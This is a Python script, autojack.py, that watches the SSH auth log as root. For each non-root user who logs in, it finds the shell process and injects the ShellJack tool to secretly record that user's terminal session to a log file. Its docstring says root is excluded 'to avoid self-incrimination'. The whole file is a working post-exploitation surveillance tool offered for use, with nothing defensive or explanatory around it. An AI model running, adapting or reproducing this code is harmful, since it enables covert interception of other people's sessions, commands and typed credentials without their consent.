#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
    autojack.py

    Original: @JusticeRage
    Updated:  @moscovium-mc

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.

    Usage: Run from a screen session and wait. Their sessions will be
    logged to LOGFILE. Root is excluded to avoid self-incrimination.
"""

import re
import subprocess
import sys
import time
import os
import signal
import logging
from pathlib import Path
from datetime import datetime

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

# Get ShellJack from https://github.com/emptymonkey/shelljack
SHELLJACK_BINARY = "/root/sj"

# Pattern: sj.log.user.timestamp
LOGFILE_PATTERN = "/root/.local/sj.log.{user}.{ts}"

# Which auth log to watch (Debian/Ubuntu vs RHEL/CentOS)
AUTH_LOGS = ["/var/log/auth.log", "/var/log/secure"]

# Don't log the root operator – they set this up and know what's happening
EXCLUDED_USERS = {"root"}

# ---------------------------------------------------------------------------
# Regexes
# ---------------------------------------------------------------------------

# Matches PAM session open lines in auth.log / secure
SESSION_OPEN_RE = re.compile(
    r"^\w{3} [ :0-9]{11} \S+ sshd\[(?P<sshd_pid>\d+)\]: "
    r"pam_unix\(sshd:session\): session opened for user "
    r"(?P<username>[a-z0-9._-]+) by \(uid=\d+\)$"
)

# ---------------------------------------------------------------------------
# Aesthetics
# ---------------------------------------------------------------------------

GREEN = "\033[92m"
ORANGE = "\033[93m"
RED = "\033[91m"
END = "\033[0m"
BOLD = "\033[1m"

def green(t):  return GREEN + t + END
def orange(t): return ORANGE + t + END
def red(t):    return RED + t + END
def bold(t):   return BOLD + t + END
def info(t):   return f"[ ] {t}"
def warn(t):   return f"[{orange('*')}] {t}"
def good(t):   return f"[{green('*')}] {green(t)}"
def err(t):    return f"[{red('!')}] {red('Error: ' + t)}"

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def check_prerequisites() -> bool:
    """Validate the environment before we start watching."""
    ok = True

    if os.geteuid() != 0:
        print(err("Must run as root."))
        ok = False

    if not Path(SHELLJACK_BINARY).exists():
        print(err(f"shelljack not found at {SHELLJACK_BINARY}. "
                  f"Grab it from https://github.com/emptymonkey/shelljack"))
        ok = False

    auth_log = find_auth_log()
    if auth_log is None:
        print(err(f"Could not find an auth log. Tried: {AUTH_LOGS}"))
        ok = False

    return ok


def find_auth_log() -> "str | None":
    for p in AUTH_LOGS:
        if Path(p).exists():
            return p
    return None


def find_bash_pid(sshd_pid: str) -> "str | None":
    """
    Walk the process tree rooted at the given sshd PID looking for a bash
    (or sh / zsh / fish) process. Returns the PID as a string, or None.
    """
    shells = {"bash", "sh", "zsh", "fish", "dash"}
    queue = [sshd_pid]
    visited = set()

    while queue:
        pid = queue.pop(0)
        if pid in visited:
            continue
        visited.add(pid)

        try:
            result = subprocess.run(
                ["pgrep", "-P", pid, "-l"],
                capture_output=True,
                text=True,
                timeout=3,
            )
        except (subprocess.TimeoutExpired, FileNotFoundError):
            continue

        for line in result.stdout.splitlines():
            parts = line.split(None, 1)
            if len(parts) != 2:
                continue
            child_pid, child_name = parts
            child_name = child_name.strip()

            if child_name in shells:
                return child_pid
            # Recurse into child sshd processes (multiplexing, PAM helpers, etc.)
            queue.append(child_pid)

    return None


def inject_shelljack(bash_pid: str, username: str) -> None:
    logfile = LOGFILE_PATTERN.format(
        user=username,
        ts=int(datetime.utcnow().timestamp()),
    )
    Path(logfile).parent.mkdir(parents=True, exist_ok=True)
    print(good(f"Injecting shelljack into PID {bash_pid} (user={username}) → {logfile}"))
    try:
        subprocess.run(
            [SHELLJACK_BINARY, "-f", logfile, bash_pid],
            check=False,
            timeout=10,
        )
        print(good("Done."))
    except FileNotFoundError:
        print(err(f"shelljack binary not found: {SHELLJACK_BINARY}"))
    except subprocess.TimeoutExpired:
        print(warn("shelljack timed out – the process may have already exited."))


def handle_session(match: re.Match) -> None:
    sshd_pid = match.group("sshd_pid")
    username = match.group("username")

    if username in EXCLUDED_USERS:
        return

    print(info(f"New SSH session for {bold(username)} (sshd pid={sshd_pid}). Hunting bash…"))

    # Give PAM / bash a moment to fully start up before we go poking around.
    time.sleep(1.5)

    bash_pid = find_bash_pid(sshd_pid)
    if bash_pid:
        inject_shelljack(bash_pid, username)
    else:
        print(warn(f"No shell process found under sshd pid={sshd_pid}. "
                   f"Session may have been short-lived."))

# ---------------------------------------------------------------------------
# Main watch loop
# ---------------------------------------------------------------------------

def tail_auth_log(path: str) -> None:
    """Tail auth.log, process matching lines, handle log rotation."""
    print(good(f"Watching {path} for new SSH sessions. Press CTRL+C to stop."))

    def _open_log(p: str):
        f = open(p, "r", errors="replace")
        f.seek(0, 2)  # seek to end – we only care about new entries
        return f

    f = _open_log(path)
    inode = os.stat(path).st_ino

    try:
        while True:
            line = f.readline()

            if line:
                m = SESSION_OPEN_RE.match(line.rstrip("\n"))
                if m:
                    handle_session(m)
            else:
                # Check for log rotation
                try:
                    current_inode = os.stat(path).st_ino
                except FileNotFoundError:
                    current_inode = None

                if current_inode != inode:
                    print(warn("Log rotation detected, reopening…"))
                    f.close()
                    time.sleep(0.5)
                    f = _open_log(path)
                    inode = os.stat(path).st_ino
                else:
                    time.sleep(0.5)

    except KeyboardInterrupt:
        print(f"\n{orange('Bye!')}")
    finally:
        f.close()


def main() -> None:
    if not check_prerequisites():
        sys.exit(1)

    auth_log = find_auth_log()
    tail_auth_log(auth_log)


if __name__ == "__main__":
    main()
